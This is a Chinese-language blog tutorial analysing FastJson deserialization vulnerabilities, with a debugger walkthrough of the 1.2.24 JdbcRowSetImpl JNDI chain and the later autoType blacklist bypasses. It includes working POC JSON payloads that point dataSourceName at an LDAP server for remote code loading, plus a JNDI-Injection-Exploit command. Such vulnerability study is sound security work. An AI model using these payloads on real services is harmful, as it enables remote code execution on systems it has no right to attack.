---
title: FastJson反序列化
date: 2025-10-21 15:00:00
tags: [java 学习]            #标签
categories: [Java]      #分类
description: FastJson反序列化        #简要说明
toc: true           #显示目录
---

# FastJson反序列化


## 基础

官方源码： https://github.com/alibaba/fastjson

使用手册： https://www.w3cschool.cn/fastjson/

Fastjson是一个Java库，可用于将Java对象转换为它们的JSON表示。它还可以用于将JSON字符串转换为等效的Java对象。Fastjson可以处理任意Java对象，包括没有源代码的预先存在的对象。

 **Java 对象和 JSON 字符串互相转换**

```plain
String jsonStr = JSON.toJSONString(obj);        // 对象 → JSON 字符串
MyClass obj = JSON.parseObject(jsonStr, MyClass.class); // JSON 字符串 → 对象
```



### 漏洞参考：

1.2.24及以下没有对序列化的类做校验,导致漏洞产生
1.2.25-1.2.41增加了黑名单限制，更改autoType默认为关闭选项。
1.2.42版本是对1.2.41及以下版本的黑名单绕过,代码内更新字符串黑名单hash方式
1.2.43版本是对1.2.42及以下版本的黑名单绕过
1.2.44-1.2.45版本1.2.43版本黑名单无法绕过,寻找新的利用链进行利用
1.2.47版本 利用fastjson处理Class类时的操作,将恶意类加载到缓存中,实现攻击
1.2.62-1.2.67版本Class不会再往缓存中加载恶意类,寻找新的利用链进行突破
1.2.68版本,使用期望类AutoCloseable来绕过fastjson校验
1.2.72-1.2.80使用期望类Throwable的子类,进行绕过



### 参考文章：

[https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson与原生反序列化/)

https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/

https://xz.aliyun.com/t/12728
https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw

Fastjson（TemplatesImpl&JdbcRowSetImpl）

https://mp.weixin.qq.com/s/XPbbgLcBmHE7dmHswY_S3Q



## 关于 autoType

**AutoType** 是 Fastjson 的一项功能：当 JSON 里出现特殊字段 `@type` 时，Fastjson 会把这个字符串当作 Java 类型的全限定名（`com.example.Foo`），尝试把该 JSON 反序列化为对应的 Java 类实例。换句话说，`@type` 让 JSON 能直接指定要生成哪个 Java 类的对象 —— 这是“多态反序列化”的一种实现方式。

`@type` 能让不受信任的 JSON 指定任意类去实例化。许多 Fastjson 漏洞就是利用了这点（`com.sun.rowset.JdbcRowSetImpl` ）

因此，默认全开 AutoType 会把应用暴露给远程任意对象创建和潜在的代码执行。



## FastJson 1.2.24 反序列化链分析

```java
package com.example.fastjson122.demos.web;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class FastJsonController {
    public static void main(	String[] args) {
        //反序列化基本使用

        //1.fastjson 解析变量数据
        //Java 字符串里 " 需要转义
        String str="{\"name\":\"theonefx\",\"age\":666}";
        // JSON.parseObject(String text) 方法，把 JSON 字符串解析成一个 JSONObject 对象，解析后，Fastjson 会自动把字符串里的 JSON 结构转成 Java 对象
        JSONObject data1 = JSON.parseObject(str);
        //直接输出 JSONObject 对象
        System.out.println(data1);

        //2.fastjson 加入User类解析:传入其他类解析后默认执行 set get类方法
        // 在 1.2.25+ 之后默认关闭了 AutoType 功能。主动拒绝了 @type 自动类型反序列化。
        String userStr = "{\"@type\":\"com.example.fastjson122.demos.web.User\",\"age\":22,\"name\":\"xiaodi\"}";
        JSONObject data2 = JSON.parseObject(userStr);
        System.out.println(data2);

        //3.fastjson 加入执行命令解析:FastJson 支持 @type 语法对应类操作
        String testStr = "{\"@type\":\"com.example.fastjson001.demos.web.Test\",\"cmd\":\"calc\"}";
        JSONObject data3 = JSON.parseObject(testStr);
        System.out.println(data3);

        //4.加入Poc类解析:JdbcRowSetImpl类解析后执行setDataSourceName setAutoCommit方法
        //注：控制 dataSourceName 值后调 setAutoCommit 触发 connect 里面的 lookup
        String pocStr = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://169.254.39.1:1389/rfkucd\", \"autoCommit\":true}\n";
        JSONObject data4 = JSON.parseObject(pocStr);
        System.out.println(data4);

        //触发 fastjson 反序列化用到 JSON.parseObject() & JSON.parse()
    }
}
```

### 分析链：

调试分析：

此处下断点调试

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091619576.png)

`parseObject` 方法调用 `parse` 方法解析字符串

`parse(text)` 是 Fastjson 的底层解析方法。

它会根据字符串的内容返回不同的对象：

- 如果是 `{...}` → 返回 `JSONObject`

- 如果是 `[...]` → 返回 `JSONArray`

- 如果是普通值 → 返回 `String`、`Number`、`Boolean` 等。



![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091620453.png)

`JSON.DEFAULT_TYPE_KEY` 是一个固定值 `@type`，一旦判断值为 `@type` ，就将其认为是类的限定，之后便尝试加载`com.sun.rowset.JdbcRowSetImpl` 类。即 `@type` = `com.sun.rowset.JdbcRowSetImpl`，fastjson 会去加载这个类。

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091623495.png)

步入 `TypeUtils.loadClass`

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091627769.png)

`config` 是 `ParserConfig` 对象，保存了各种类的反序列化器;`deserialze` 方法的三个参数：

1. `this` → 当前解析器（`DefaultJSONParser`），里面有 lexer、上下文等信息。

1. `clazz` → 要生成的 Java 类。

1. `fieldName` → 字段名（如果这是某个字段的值）。

这个方法会根据 `clazz` 的结构，从 JSON 中取值，并用反射或类型转换来创建对象并赋值



![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091628887.png)

在执行反序列化的过程中，变量中出现了 `JdbcRowSetImpl`

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091634392.png)

经过漫长的跟踪，来到了关键点。。（对于一些不重要的判断可以跳过，追踪关键点）

这是反序列化RCE的触发点，`InitialContext` 是 JNDI（Java Naming and Directory Interface）的入口类，`lookup()` 会根据传入的地址去访问远程服务

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091639344.png)





![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091641791.png)



### 总结分析链：

parseObject ->  parse -> key(@type) -> TypeUtils.loadClass -> ObjectDeserializer -> JdbcRowSetImpl -> connect -> lookup



![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091652348.png)

结合 **传入其他类，解析后默认执行 set get类方法** 的结论，当走到 `JdbcRowSetImpl.class` 中触发了其中的set、get方法，而 `setAutoCommit` 中恰好有 `connect` 方法，触发执行了 `lookup` 方法，而 `lookup` 方法中 触发了 `getDataSourceName` ，所以 poc 构造的思路就有了：

1. `@type` : 告诉 Fastjson 将它反序列化成指定的 Java 类，即 "com.sun.rowset.JdbcRowSetImpl"

1. `dataSourceName` : JDBC 连接的数据源，此处使用 `Java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc"`

1. `autoCommit` : 调用 `setAutoCommit(true)` ，触发逻辑

```plain
{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://169.254.39.1:1389/rfkucd\", \"autoCommit\":true}
-->
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://169.254.39.1:1389/rfkucd",
  "autoCommit": true
}
```

这样就可以达到 `lookup` 访问远程服务的目的，造成了反序列化RCE漏洞。

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091653730.png)

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091655152.png)

当然，1.2.24 的漏洞在之后的版本已经被修复，默认不开启 autoType

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508100949058.png)



## FastJson 1.2.25-1.2.47 CC链分析

### 1、开启 autoType

#### 漏洞利用条件：

1. 开启 `AutoTypeSupport`

1. 加 `L` 和 `;`

```plain
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String testPoc = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://169.254.39.1:1389/5uppp0\",\"autoCommit\":\"true\"}";
JSONObject test = JSON.parseObject(testPoc);
```

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101014904.png)



#### POC 分析&链分析：

`JSONObject test = JSON.parseObject(testPoc);` 断点调试

判断 key == @type

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101025365.png)

步入 `checkAutoType`，`acceptList`白名单，这里的 `checkAutoType` 中`acceptList` 为空数组，不会匹配白名单，而是进入下方的黑名单

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101029937.png)

可以看到先进入黑名单进行判断：

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101033816.png)

黑名单依次进行判断

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101040522.png)

继续执行。这一步看到判断了 `className` 的开头和结尾如果分别为`L`和`;`，则进入`substring`

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101044398.png)

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101047885.png)

在执行了 `substring` 之后，原本的`className = Lcom.sun.rowset.JdbcRowSetImpl;` 被替换成了 `newClassName = com.sun.rowset.JdbcRowSetImpl`

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101047540.png)

之后同 1.2.24 的反序列化链

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101054144.png)





**接下来分析不开启** `AutoTypeSupport`

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101056293.png)

来到白名单，`autoTypeSupport` 判断为 `false`

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101057185.png)

在这一步进行黑名单循环

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101100575.png)

判断为异常，报错，结束

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101102069.png)

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101103424.png)

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101103380.png)

#### 总结分析链：

parseObject ->  key(@type) -> checkAutoType -> denyList -> substring -> loadClass -> newClassName = com.sun.rowset.JdbcRowSetImpl

这些版本都是结合黑名单进行构造绕过，比如 加 `L` 和 `;`、加 `LL` 和 `;;`、加 `[` 等等，关键点要开启 `AutoTypeSupport`

> 从1.2.41说起。在checkAutotype()函数中，会先检查传入的@type的值是否是在黑名单里，如果要反序列化的类不在黑名单中，那
>
> 么才会对其进行反序列化。问题来了，在反序列化前，会经过loadClass()函数进行处理，其中一个处理方法是：在加载类的时候会去
>
> 掉className前后的L和;。所以，如果我们传入Lcom.sun.rowset.JdbcRowSetImpl;，在经过黑白名单后，在加载类时会去掉前后的
>
> L和;，就变成了com.sun.rowset.JdbcRowSetImpl，反序列化了恶意类。
>
> 更新了1.2.42，方法是先判断反序列化目标类的类名前后是不是`L`和`;`，如果是，那么先去掉L和;，再进行黑白名单校验（偷懒
>
> qaq）。关于1.2.42绕过非常简单，只需要双写L和;，就可以在第一步去掉L和;后，与1.2.41相同。
>
> 更新也非常随意，在1.2.43中，黑白名单判断前，又增加了一个是否以LL开头的判断，如果以LL开头，那么就直接抛异常，非常随意
>
> 解决了双写的问题。但是除了L和;，FastJson在加载类的时候，不只对L和;这样的类进行特殊处理，[也对特殊处理了，所以，同样的
>
> 方式在前面添加[绕过了1.2.43及之前的补丁。
>
> 在1.2.44中，黑客们烦不烦，来了个狠的：只要你以`[`开头或者`;`结尾，我直接抛一个异常。如此，终于解决了缠绵多个版本的漏洞。





### 2、checkAutotype绕过

FastJson有一个全局缓存机制：在解析json数据前会先加载相关配置，调用 addBaseClassMappings() 和 loadClass() 函数将一些基础类和第三方库存放到 mappings 中（mappings 是 ConcurrentMap 类，所以我们在一次连接中传入两个键值 a 和 b ，之后在解析时，如果没有开启 autotype，会从 mappings 或 deserializers.findClass() 函数中获取反序列化的对应类，如果有，则直接返回绕过了黑名单。利用的是 java.lang.Class 类，其反序列化处理类 MiscCodec 类可以将任意类加载到 mappings 中，实现了目标。

第一步利用 java.lang.Class 将恶意类加载到 mappings 中；

第二步从在 checkAutoType 内部，没有开启 autotype ，直接从 mappings 中获取 mappings 中取出恶意类并绕过黑名单进行了反序列化。

![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101120042.png)



POC:

```java
testStr={
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
"dataSourceName":"ldap://169.254.39.1:1389/is9aig",
        "autoCommit":true
    }
}
```